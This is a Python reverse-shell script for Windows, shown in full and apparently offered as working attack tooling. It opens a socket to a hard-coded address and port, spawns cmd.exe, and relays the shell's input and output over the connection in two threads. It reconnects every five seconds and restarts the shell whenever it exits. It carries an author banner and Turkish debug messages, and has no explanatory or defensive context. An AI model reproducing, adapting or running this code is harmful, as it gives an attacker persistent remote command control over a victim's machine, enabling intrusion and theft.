host="192.168.101.161"
port=3366
from subprocess import Popen, PIPE
import socket,threading,time
def s2p( p):
    global s,flag
    while True:
        try:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()
        except Exception as msg:
            print(msg)
            flag=False
            baglan()
            

def p2s( p):
    global s
    while True:
        try:
            s.send(p.stdout.read(1))
        except socket.error:
            flag=False
            baglan()
        

def baglan():
    global s,flag
    try:
        
        if not flag:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((host,port))
            flag=True
            s.send("\n-------------------------------\n   Developed by 0xM4M1     \n-------------------------------\n".encode())
            print ("bagli")
    except:
        flag=False
        time.sleep(5)
        print ("siktir et")

flag=False
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
p=Popen(['\\windows\system32\\cmd.exe'],shell=True, stdout=PIPE, stdin=PIPE,stderr=PIPE)
s2p_thread = threading.Thread(target=s2p, args=[ p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[p])
p2s_thread.daemon = True
p2s_thread.start()
while True:
    p.wait()
    p=Popen(['\\windows\system32\\cmd.exe'],shell=True, stdout=PIPE, stdin=PIPE,stderr=PIPE)
s.close()
